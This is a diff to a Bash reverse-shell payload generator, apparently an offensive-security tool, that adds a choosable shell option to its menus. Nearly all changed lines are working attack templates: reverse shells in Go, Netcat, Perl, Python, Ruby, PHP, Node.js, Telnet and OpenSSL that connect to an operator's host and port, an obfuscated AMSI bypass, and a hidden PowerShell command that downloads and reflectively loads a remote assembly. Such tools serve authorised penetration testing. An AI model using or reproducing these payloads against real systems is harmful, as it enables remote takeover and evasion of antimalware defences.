@@ -4,7 +4,7 @@
 #Mastadon: 4ndr34z@infosec.exchange
 #Web: https://f20.be
 
-version="1.5.4"
+version="1.5.5"
 
 ### Colors ##
 ESC=$(printf '\033') RESET="${ESC}[0m" BLACK="${ESC}[30m" RED="${ESC}[31m"
@@ -561,7 +561,7 @@ then
     PORT=$ngrokPORT
 fi
 header
-rev="echo 'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\",\"$IP:$PORT\");cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go"
+rev="echo 'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\",\"$IP:$PORT\");cmd:=exec.Command(\"$nshell\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go"
 
 if [[ $1 == "url" ]] 
 then
@@ -747,6 +747,9 @@ fi
 
 ### reflective
 function powershell_reflective () {
+
+placeh=$(openssl rand -hex $(shuf -i 1-11 -n1))
+
 header
 if [ $usingngrok == 1 ]
 then 
@@ -765,7 +768,7 @@ fi
                 echo "This shell needs a full AMSI bypass to run."
                 read -p "Please enter url for AMSI bypass [$amsiurl]: " aurl
                 aurl=${aurl:-$amsiurl}
-                fAMSIb="IEX (New-Object System.Net.Webclient).DownloadString('$aurl');"
+                fAMSIb="IEX (New-Object System.\$$placeh"Net.Webclient").DownloadString('$aurl');"
         
             else
                 
@@ -791,7 +794,7 @@ pwsh=$(shuf -er -n21  {A..Z} {a..z} | tr -d '\n')
 
 AMSIb="(([Ref].Assembly.GetTypes()|?{\$_-clike'*si*s'}).GetFields(2*20)|?{\$_-clike'*Ini*'}).SetValue(\$$placeh,\$true);"
 
-rev="$AMSIb\$$bytes = (curl $url -UseBasicParsing ).Content;\$$assembly = [Reflection.Assembly]::Load(\$$bytes);\$$entryPointMethod = @(\$$assembly.GetTypes().GetMethod('Main', [Reflection.BindingFlags] 'Static, Public, NonPublic') ) -ne \$null;\$$entryPointMethod.Invoke(\$null, (, [string[]] ('$IP', '$PORT')))"
+rev="$AMSIb\$$bytes = (curl $url -UseBasicParsing ).Content;\$$assembly = [Reflection.Assembly]::Load(\$$bytes);\$$entryPointMethod = @(\$$assembly.GetTypes().GetMethod('Main', [Reflection.BindingFlags] 'Static, Public, NonPublic') ) -ne \$$placeh;\$$entryPointMethod.Invoke(\$$placeh, (, [string[]] ('$IP', '$PORT')))"
 rev=$(echo -n $rev| iconv --to-code UTF-16LE | $benc --base64 -w0)
 rev="cmd /c \"set ${pwsh}=powershell & set ${space}=\" \" & call %${pwsh}%%${space}%-W%${space}%Hidden%${space}%-noprofile%${space}%-executionpolicy%${space}%bypass%${space}%-NoExit%${space}%-e%${space}%${rev}\""
 
@@ -821,9 +824,9 @@ header
 
 if [[ $2 == "loop" ]] 
 then
-    rev="while true; do sleep 10 && mknod /dev/shm/p p; cat /dev/shm/p | bash -i | nc $IP $PORT >/dev/shm/p; done"
+    rev="while true; do sleep 10 && mknod /dev/shm/p p; cat /dev/shm/p | $nshell -i | nc $IP $PORT >/dev/shm/p; done"
 else 
-    rev="rm /tmp/meh;mkfifo /tmp/meh; nc $IP $PORT 0</tmp/meh | /bin/sh >/tmp/meh 2>&1; rm /tmp/meh"
+    rev="rm /tmp/meh;mkfifo /tmp/meh; nc $IP $PORT 0</tmp/meh | $nshell >/tmp/meh 2>&1; rm /tmp/meh"
 fi
 if [[ $1 == "url" ]] 
 then
@@ -885,7 +888,7 @@ then
     PORT=$ngrokPORT
 fi
 header
-rev="ruby -rsocket -e'spawn(\"sh\",[:in,:out,:err]=>TCPSocket.new(\"$IP\",$PORT))'"
+rev="ruby -rsocket -e'spawn(\"$nshell\",[:in,:out,:err]=>TCPSocket.new(\"$IP\",$PORT))'"
 
 if [[ $1 == "url" ]] 
 then
@@ -915,7 +918,7 @@ then
     PORT=$ngrokPORT
 fi
 header
-rev="require('child_process').exec('rm /tmp/meh;mkfifo /tmp/meh; nc $IP $PORT 0</tmp/meh | /bin/sh >/tmp/meh 2>&1; rm /tmp/meh')"
+rev="require('child_process').exec('rm /tmp/meh;mkfifo /tmp/meh; nc $IP $PORT 0</tmp/meh | $nshell >/tmp/meh 2>&1; rm /tmp/meh')"
 
 if [[ $1 == "url" ]] 
 then
@@ -967,7 +970,7 @@ fi
 header
 #echo "Generating certificate..."
 openssl req -x509 -newkey rsa:4096 -keyout /tmp/k.pem -out /tmp/c.pem -days 365 -nodes -subj "/C=US/ST=*/L=*/O=*/CN=shells.com"
-rev="mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect $IP:$PORT > /tmp/s; rm /tmp/s"
+rev="mkfifo /tmp/s; $nshell -i < /tmp/s 2>&1 | openssl s_client -quiet -connect $IP:$PORT > /tmp/s; rm /tmp/s"
 
 if [[ $1 == "url" ]] 
 then
@@ -1454,7 +1457,7 @@ then
     PORT=$ngrokPORT
 fi
 header
-rev="perl -e 'use Socket;\$i=\"$IP\";\$p=$PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"sh -i\");};'"
+rev="perl -e 'use Socket;\$i=\"$IP\";\$p=$PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"$nshell\");};'"
 
 if [[ $1 == "url" ]] 
 then
@@ -1497,7 +1500,7 @@ then
     pythonv="python3"
 fi
 
-rev="$pythonv -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$IP\",$PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"bash\")'"
+rev="$pythonv -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$IP\",$PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"$nshell\")'"
 wrev2="python.exe -c \"(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('$IP', $PORT)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\windows\\system32\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) > 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))\""
 wrev3="python.exe -c \"import socket,os,threading,subprocess as sp;p=sp.Popen(['cmd.exe'],stdin=sp.PIPE,stdout=sp.PIPE,stderr=sp.STDOUT);s=socket.socket();s.connect(('$IP',$PORT));threading.Thread(target=exec,args=(\"while(True):o=os.read(p.stdout.fileno(),1024);s.send(o)\",globals()),daemon=True).start();threading.Thread(target=exec,args=(\\\"while(True):i=s.recv(1024);os.write(p.stdin.fileno(),i)\\\",globals())).start()\""
 
@@ -1543,7 +1546,7 @@ then
     PORT=$ngrokPORT
 fi
 header
-rev="e=\$(mktemp -u);mkfifo \$e && telnet $IP $PORT 0<\$e | sh 1>\$e"
+rev="e=\$(mktemp -u);mkfifo \$e && telnet $IP $PORT 0<\$e | $nshell 1>\$e"
 
 if [[ $1 == "url" ]] 
 then
@@ -1612,7 +1615,7 @@ else
     exec=$2
 fi
 
-rev="php -r '\$sock=fsockopen(\"$IP\",$PORT);\$c=\"bash <&3 >&3 2>&3\";$exec("\$c");'"
+rev="php -r '\$sock=fsockopen(\"$IP\",$PORT);\$c=\"$nshell <&3 >&3 2>&3\";$exec("\$c");'"
 
 if [[ $1 == "url" ]] 
 then
@@ -1711,13 +1714,19 @@ fi
 }
 
 submenu_ruby() {
+if [ "$nshell" == "" ]
+then
+    nshell="/bin/bash"
+fi
 header
     echo -ne "
 $(blueprint 'Ruby')
 $(greenprint '1)') No encoding
 $(greenprint '2)') Base64 encoded
 $(greenprint '3)') URL encoded
-$(greenprint '4)') Double URL encoded
+$(greenprint '4)') Double URL encoded\n\n
+$(cyanprint "OPTIONS")
+$(greenprint 's)') Which shell [$nshell]
 $(magentaprint 'm)') Go Back to Main Menu
 $(redprint '0)') Exit
 
@@ -1736,6 +1745,14 @@ Choose an option:  "
     4)
         ruby "urlx2"
         ;;
+    s)
+        echo ""
+        oshell="bash"
+        read -p "Please enter shell [$oshell]: " nshell
+        nshell=${nshell:-$oshell}
+        submenu_ruby
+        ;;
+
     m)
         mainmenu
         ;;
@@ -1752,6 +1769,10 @@ Choose an option:  "
 
 
 submenu_nodejs() {
+if [ "$nshell" == "" ]
+then
+    nshell="/bin/bash"
+fi
 header
     echo -ne "
 $(blueprint 'node.js')
@@ -1761,7 +1782,9 @@ $(greenprint '3)') URL encoded
 $(greenprint '4)') Double URL encoded
 $(greenprint '5)') XSS variant 1
 $(greenprint '6)') XSS variant 2
-$(greenprint '7)') Deserialize
+$(greenprint '7)') Deserialize\n\n
+$(cyanprint "OPTIONS")
+$(greenprint 's)') Which shell [$nshell]
 $(magentaprint 'm)') Go Back to Main Menu
 $(redprint '0)') Exit
 
@@ -1788,6 +1811,13 @@ Choose an option:  "
         ;;
     7)
         node "deserial"
+        ;;
+    s)
+        echo ""
+        oshell="/bin/bash"
+        read -p "Please enter shell [$oshell]: " nshell
+        nshell=${nshell:-$oshell}
+        submenu_nodejs
         ;;
     m)
         mainmenu
@@ -2114,13 +2144,19 @@ Choose an option:  "
 }
 
 submenu_go_lang() {
+if [ "$nshell" == "" ]
+then
+    nshell="/bin/sh"
+fi
 header
     echo -ne "
 $(blueprint 'Golang')
 $(greenprint '1)') No encoding
 $(greenprint '2)') Base64 encoded
 $(greenprint '3)') URL encoded
-$(greenprint '4)') Double URL encoded
+$(greenprint '4)') Double URL encoded\n\n
+$(cyanprint "OPTIONS")
+$(greenprint 's)') Which shell [$nshell]
 $(magentaprint 'm)') Go Back to Main Menu
 $(redprint '0)') Exit
 
@@ -2139,6 +2175,13 @@ Choose an option:  "
     4)
         go_lang "urlx2"
         ;;
+    s)
+        echo ""
+        oshell="/bin/sh"
+        read -p "Please enter shell [$oshell]: " nshell
+        nshell=${nshell:-$oshell}
+        submenu_go_lang
+        ;;
     m)
         mainmenu
         ;;
@@ -2153,6 +2196,10 @@ Choose an option:  "
 }
 
 submenu_php() {
+if [ "$nshell" == "" ]
+then
+    nshell="/bin/bash"
+fi
 header
     echo -ne "
 $(blueprint 'PHP')
@@ -2163,7 +2210,9 @@ $(greenprint '4)') exec Double URL encoded
 $(greenprint '5)') system No encoding
 $(greenprint '6)') system Base64 encoded
 $(greenprint '7)') system URL encoded
-$(greenprint '8)') system Double URL encoded
+$(greenprint '8)') system Double URL encoded\n\n
+$(cyanprint "OPTIONS")
+$(greenprint 's)') Which shell [$nshell]
 $(magentaprint 'm)') Go Back to Main Menu
 $(redprint '0)') Exit
 
@@ -2194,6 +2243,13 @@ Choose an option:  "
     8)
         php "urlx2" "system"
         ;;
+    s)
+        echo ""
+        oshell="/bin/bash"
+        read -p "Please enter shell [$oshell]: " nshell
+        nshell=${nshell:-$oshell}
+        submenu_php
+        ;;
     m)
         mainmenu
         ;;
@@ -2209,13 +2265,19 @@ Choose an option:  "
 
 
 submenu_telnet() {
+if [ "$nshell" == "" ]
+then
+    nshell="sh"
+fi
 header
     echo -ne "
 $(blueprint 'Telnet')
 $(greenprint '1)') No encoding
 $(greenprint '2)') Base64 encoded
 $(greenprint '3)') URL encoded
-$(greenprint '4)') Double URL encoded
+$(greenprint '4)') Double URL encoded\n\n
+$(cyanprint "OPTIONS")
+$(greenprint 's)') Which shell [$nshell]
 $(magentaprint 'm)') Go Back to Main Menu
 $(redprint '0)') Exit
 
@@ -2234,6 +2296,13 @@ Choose an option:  "
     4)
         telnet "urlx2"
         ;;
+    s)
+        echo ""
+        oshell="sh"
+        read -p "Please enter shell [$oshell]: " nshell
+        nshell=${nshell:-$oshell}
+        submenu_telnet
+        ;;
     m)
         mainmenu
         ;;
@@ -2248,13 +2317,19 @@ Choose an option:  "
 }
 
 submenu_perl() {
+if [ "$nshell" == "" ]
+then
+    nshell="sh -i"
+fi
 header
     echo -ne "
 $(blueprint 'Perl')
 $(greenprint '1)') No encoding
 $(greenprint '2)') Base64 encoded
 $(greenprint '3)') URL encoded
-$(greenprint '4)') Double URL encoded
+$(greenprint '4)') Double URL encoded\n\n
+$(cyanprint "OPTIONS")
+$(greenprint 's)') Which shell [$nshell]
 $(magentaprint 'm)') Go Back to Main Menu
 $(redprint '0)') Exit
 
@@ -2273,6 +2348,14 @@ Choose an option:  "
     4)
         perl "urlx2"
         ;;
+    s)
+        echo ""
+        oshell="sh -i"
+        read -p "Please enter shell [$oshell]: " nshell
+        nshell=${nshell:-$oshell}
+        submenu_perl
+        ;;
+
     m)
         mainmenu
         ;;
@@ -2382,6 +2465,7 @@ Choose an option:  "
 }
 
 submenu_awk() {
+
 header
     echo -ne "
 $(blueprint 'awk')
@@ -2407,6 +2491,7 @@ Choose an option:  "
     4)
         awk_s "urlx2"
         ;;
+
     m)
         mainmenu
         ;;
@@ -2421,13 +2506,19 @@ Choose an option:  "
 }
 
 submenu_open_s() {
+if [ "$nshell" == "" ]
+then
+    nshell="/bin/bash"
+fi
 header
     echo -ne "
 $(blueprint 'OpenSSL')
 $(greenprint '1)') No encoding
 $(greenprint '2)') Base64 encoded
 $(greenprint '3)') URL encoded
-$(greenprint '4)') Double URL encoded
+$(greenprint '4)') Double URL encoded\n\n
+$(cyanprint "OPTIONS")
+$(greenprint 's)') Which shell [$nshell]
 $(magentaprint 'm)') Go Back to Main Menu
 $(redprint '0)') Exit
 
@@ -2445,6 +2536,13 @@ Choose an option:  "
         ;;
     4)
         open_s "urlx2"
+        ;;
+    s)
+        echo ""
+        oshell="/bin/bash"
+        read -p "Please enter shell [$oshell]: " nshell
+        nshell=${nshell:-$oshell}
+        submenu_open_s
         ;;
     m)
         mainmenu
@@ -2526,7 +2624,11 @@ Choose an option:  "
 
 submenu_netcat() {
 header
-    echo -ne "
+if [ "$nshell" == "" ]
+then
+    nshell="/bin/bash"
+fi
+echo -ne "
 $(blueprint 'Netcat')
 $(greenprint '1)') No encoding
 $(greenprint '2)') Base64 encoded
@@ -2535,7 +2637,10 @@ $(greenprint '4)') Double URL encoded
 $(greenprint '5)') Looping, no encoding
 $(greenprint '6)') Looping, Base64 encoded
 $(greenprint '7)') Looping, URL encoded
-$(greenprint '8)') Looping, double URL encoded
+$(greenprint '8)') Looping, double URL encoded\n\n
+$(cyanprint "OPTIONS")
+$(greenprint 's)') Which shell [$nshell]
+
 $(magentaprint 'm)') Go Back to Main Menu
 $(redprint '0)') Exit
 
@@ -2566,6 +2671,15 @@ Choose an option:  "
     8)
         netcat "urlx2" "loop"
         ;;
+    s)
+        echo ""
+        oshell="bash"
+        read -p "Please enter shell [$oshell]: " nshell
+        nshell=${nshell:-$oshell}
+        submenu_netcat
+        ;;
+
+
     m)
         mainmenu
         ;;
@@ -2579,6 +2693,10 @@ Choose an option:  "
 }
 
 submenu_python() {
+if [ "$nshell" == "" ]
+then
+    nshell="/bin/bash"
+fi
 header
     echo -ne "
 $(blueprint 'Python')
@@ -2593,7 +2711,9 @@ $(greenprint '8)')  Windows Python3 - URL encoded
 $(greenprint '9)')  Windows Python3 - Double URL encoded
 $(greenprint '10)') Windows Python2 - No encoding
 $(greenprint '11)') Windows Python2 - URL encoded
-$(greenprint '12)') Windows Python2 - Double URL encoded
+$(greenprint '12)') Windows Python2 - Double URL encoded\n\n
+$(cyanprint "OPTIONS")
+$(greenprint 's)') Which shell [$nshell]
 $(magentaprint 'm)')  Go Back to Main Menu
 $(redprint '0)')  Exit
 
@@ -2635,6 +2755,13 @@ Choose an option:  "
         ;;
     12)
         python "wpython" "urlx2"
+        ;;
+    s)
+        echo ""
+        oshell="bash"
+        read -p "Please enter shell [$oshell]: " nshell
+        nshell=${nshell:-$oshell}
+        submenu_python
         ;;
     m)
         mainmenu
